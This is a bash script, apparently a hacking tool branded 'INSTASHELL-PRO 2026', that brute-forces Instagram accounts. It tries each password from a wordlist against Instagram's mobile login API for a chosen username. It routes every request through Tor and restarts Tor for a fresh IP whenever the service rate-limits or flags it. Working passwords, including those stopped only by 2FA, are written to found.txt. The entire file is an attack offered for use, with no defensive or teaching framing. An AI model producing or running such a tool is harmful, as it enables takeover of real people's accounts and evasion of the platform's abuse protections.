#!/bin/bash
# KHALID HUSAIN | INSTASHELL-PRO 2026 FINAL
# FIXED: Invalid_User loops & Modern Signature Verification

trap 'exit 1' 2

banner() {
    clear
    printf "\e[1;92m"
    printf "  ██╗  ██╗██╗  ██╗ █████╗ ██╗     ██╗██████╗ \n"
    printf "  ██║ ██╔╝██║  ██║██╔══██╗██║     ██║██╔══██╗\n"
    printf "  █████╔╝ ███████║███████║██║     ██║██║  ██║\n"
    printf "  ██╔═██╗ ██╔══██║██╔══██║██║     ██║██║  ██║\n"
    printf "  ██║  ██╗██║  ██║██║  ██║███████╗██║██████╔╝\n"
    printf "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ \n"
    printf "       \e[1;93mH  U  S  A  I  N    7  8  6\e[0m\n"
    printf "\e[1;77m\e[45m    2026 STABLE VERSION | RE-CODED BY: KHALID HUSAIN    \e[0m\n\n"
}

# AUTO-REFRESH TOR IDENTITY
refresh_ip() {
    printf "\e[1;91m[!] Flagged. Getting new IP...\e[0m\n"
    sudo service tor restart > /dev/null 2>&1
    sleep 8
}

start() {
    banner
    if ! pgrep -x "tor" > /dev/null; then
        printf "\e[1;91m[!] Tor is OFF. Starting it for you...\e[0m\n"
        sudo service tor start && sleep 5
    fi

    read -p $'\e[1;92mUsername account: \e[0m' user
    user=$(echo "$user" | tr '[:upper:]' '[:lower:]' | tr -d ' ')
    
    read -p $'\e[1;92mPassword List: \e[0m' wl_pass
    wl_pass="${wl_pass:-passwords.lst}"
}

bruteforcer() {
    printf "\e[1;92m[*] Target Verified: $user...\e[0m\n\n"
    
    while IFS= read -r pass || [ -n "$pass" ]; do
        pass=$(echo "$pass" | tr -d '\r' | xargs)
        [ -z "$pass" ] && continue

        # GENERATE SESSION DATA
        guid=$(openssl rand -hex 16)
        device="android-$(openssl rand -hex 8)"
        ts=$(date +%s)
        
        # VERSION 0 BYPASS: Tells the server we are sending plain text
        data="{\"phone_id\":\"$guid\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"enc_password\":\"#PWD_INSTAGRAM_BROWSER:0:$ts:$pass\", \"login_attempt_count\":\"0\"}"
        sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)

        printf "\e[1;77mTesting: %-20s \e[0m" "$pass"

        # 2026 AGENT: Android 15 / Pixel 9 Pro
        response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
            -A "Instagram 325.0.0.45.110 Android (35/15; Google; Pixel 9 Pro)" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
            "https://i.instagram.com/api/v1/accounts/login/")

        # RESPONSE CHECKER
        if [[ $response == *"logged_in_user"* ]]; then
            printf "\e[1;92m[SUCCESS!]\e[0m\n"
            echo "$user:$pass" >> found.txt && exit 0
        elif [[ $response == *"invalid_user"* ]]; then
            printf "\e[1;91m[REJECTED]\e[0m\n"
            refresh_ip # Changes IP to unblock the username check
        elif [[ $response == *"challenge"* ]]; then
            printf "\e[1;93m[2FA CODE NEEDED]\e[0m\n"
            echo "2FA: $user:$pass" >> found.txt && exit 0
        elif [[ $response == *"Please wait"* ]]; then
            printf "\e[1;91m[LIMIT]\e[0m\n"
            refresh_ip
        else
            printf "\e[1;90m[WRONG]\e[0m\n"
        fi
        sleep $(( ( RANDOM % 3 ) + 2 ))
    done < "$wl_pass"
}

start
bruteforcer
